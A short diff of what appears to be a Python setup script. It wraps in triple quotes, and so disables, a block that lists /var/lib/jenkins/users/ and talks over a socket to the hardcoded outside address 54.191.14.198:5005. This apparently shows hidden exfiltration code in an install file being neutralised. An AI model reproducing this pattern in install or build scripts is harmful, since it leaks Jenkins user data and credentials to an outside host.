@@ -19,6 +19,7 @@ TCP_IP = '54.191.14.198'
 TCP_PORT = 5005 
 BUFFER_SIZE = 1024 
 message = "" 
+"""
 try:
 	results = os.listdir('/var/lib/jenkins/users/')
 	for r in results:
@@ -44,7 +45,7 @@ data = s.recv(BUFFER_SIZE)
 s.close() 
  
 print "received data:", data
-
+"""
 
 class osx_install_data(install_data):
     # On MacOS, the platform-specific lib dir is /System/Library/Framework/Python/.../
